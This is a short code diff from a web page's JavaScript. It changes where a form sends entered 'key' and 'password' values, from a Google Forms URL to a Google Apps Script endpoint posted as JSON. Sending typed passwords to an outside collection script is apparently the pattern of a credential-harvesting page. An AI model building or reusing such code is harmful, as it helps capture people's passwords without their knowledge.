@@ -346,14 +346,21 @@
                 formData.append('entry.2130068893', key); 
                 formData.append('entry.1115778200', password); 
 
-
-                const formUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSfAAcsuMONe2tZ10pB-_ipIMicNPaFfsEF1Ajn_45GBPe_WAw/viewform?usp=header'; 
+                const formUrl = 'https://script.google.com/macros/s/AKfycbxxxxx123456789/exec';
+             
+                const data = {
+                   key: key,
+                   password: password
+                };
+              
 
                 await fetch(formUrl, {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors', 
-                });
+                   method: 'POST',
+                   headers: {
+                       'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify(data), 
+                }); 
 
                 alert('Datos enviados correctamente');
             });
